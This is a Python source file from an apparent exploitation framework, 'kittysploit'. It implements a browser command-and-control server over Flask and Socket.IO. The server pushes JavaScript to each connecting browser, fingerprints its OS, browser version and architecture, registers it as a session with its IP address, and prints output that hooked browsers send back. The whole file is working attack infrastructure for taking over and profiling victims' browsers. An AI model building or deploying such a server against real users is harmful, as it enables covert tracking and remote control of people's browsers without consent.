from kittysploit.core.framework.browser_server.base_browser_server import app, sio
from kittysploit.core.base.io import print_error, print_info, print_status
from kittysploit.core.base.sessions import Sessions
from kittysploit.core.framework.session_type import SessionType
from flask import Response, render_template, make_response, request, send_from_directory
import json

@sio.on("connect", namespace="/remote")
def connect():
    script_os = """
        var navUserAgent = navigator.userAgent;
        var browserName  = navigator.appName;
        var browserVersion  = ''+parseFloat(navigator.appVersion); 
        var majorVersion = parseInt(navigator.appVersion,10);
        var tempNameOffset,tempVersionOffset,tempVersion;
        if ((tempVersionOffset=navUserAgent.indexOf("Opera"))!=-1) {
            browserName = "Opera";
            browserVersion = navUserAgent.substring(tempVersionOffset+6);
            if ((tempVersionOffset=navUserAgent.indexOf("Version"))!=-1) 
            browserVersion = navUserAgent.substring(tempVersionOffset+8);
        } else if ((tempVersionOffset=navUserAgent.indexOf("MSIE"))!=-1) {
            browserName = "Microsoft Internet Explorer";
            browserVersion = navUserAgent.substring(tempVersionOffset+5);
        } else if ((tempVersionOffset=navUserAgent.indexOf("Chrome"))!=-1) {
            browserName = "Chrome";
            browserVersion = navUserAgent.substring(tempVersionOffset+7);
        } else if ((tempVersionOffset=navUserAgent.indexOf("Safari"))!=-1) {
            browserName = "Safari";
            browserVersion = navUserAgent.substring(tempVersionOffset+7);
            if ((tempVersionOffset=navUserAgent.indexOf("Version"))!=-1) 
            browserVersion = navUserAgent.substring(tempVersionOffset+8);
        } else if ((tempVersionOffset=navUserAgent.indexOf("Firefox"))!=-1) {
            browserName = "Firefox";
            browserVersion = navUserAgent.substring(tempVersionOffset+8);
        } else if ( (tempNameOffset=navUserAgent.lastIndexOf(' ')+1) < (tempVersionOffset=navUserAgent.lastIndexOf('/')) ) {
            browserName = navUserAgent.substring(tempNameOffset,tempVersionOffset);
            browserVersion = navUserAgent.substring(tempVersionOffset+1);
            if (browserName.toLowerCase()==browserName.toUpperCase()) {
            browserName = navigator.appName;
            }
        }

        if ((tempVersion=browserVersion.indexOf(";"))!=-1)
            browserVersion=browserVersion.substring(0,tempVersion);
        if ((tempVersion=browserVersion.indexOf(" "))!=-1)
            browserVersion=browserVersion.substring(0,tempVersion);
        
        var os = "Unknown";
        if (navigator.appVersion.indexOf("Win") != -1){
            os = "Windows";
        }
        else if (navigator.appVersion.indexOf("Mac") != -1){
            os = "MacOS";
        }
        else if (navigator.appVersion.indexOf("Linux") != -1){
            os = "Linux";
        }
        else if (navigator.appVersion.indexOf("X11") != -1){
            os = "Unix";
        }
        var arch = "";
        if (navigator.appVersion.indexOf("x86_64") != -1){
            arch = "x86_64";
        }
        else if (navigator.appVersion.indexOf("i686") != -1){
            arch = "i686";
        }
        console.log({"os": os, "browser": browserName, "browser_version": browserVersion, "arch": arch});
        sendOutput("1234", {"os": os, "browser": browserName, "browser_version": browserVersion, "arch": arch}, listener="new_session");
"""
    # send detect navigation
    sio.emit(
        "issue_task",
        {"task_id": "123456", "input": script_os},
        room=request.sid,
        namespace="/remote",
    )


@sio.on("disconnect", namespace="/remote")
def disconnect():
    session = Sessions()
    session.delete_web_session(request.sid)


@sio.on("new_session", namespace="/remote")
def new_session(data):
    output_json = data["output"]
    output = json.loads(output_json)
    session = Sessions()
    session.add_session(
        output["arch"],
        output["os"],
        output["browser_version"],
        SessionType.JAVASCRIPT,
        request.remote_addr,
        request.environ.get("REMOTE_PORT"),
        request.sid,
    )


@sio.on("output_error", namespace="/remote")
def output_error(e):
    print_error("Error: ", str(e))


@sio.on("send_data", namespace="/remote")
def send_data(data):
    if data["output"] == "undefined":
        return
    print_info(str(data["output"]))


@app.route("/")
def index():
    response = make_response(render_template("index.html"))
    response.headers.add("Access-Control-Allow-Origin", "*")
    return response

@app.route('/static/<path:path>')
def send_static(path):
    return send_from_directory('static', path)

def start_browser_server(host="0.0.0.0", port=5555):
    try:
        sio.run(app, host=host, port=port, debug=False)
        
    except KeyboardInterrupt:
        sio.stop()
    except OSError as e:
        if "Address already in use" in str(e):
            print_error("Port already in use")
            return
    except Exception as e:
        print_error(str(e))
        return
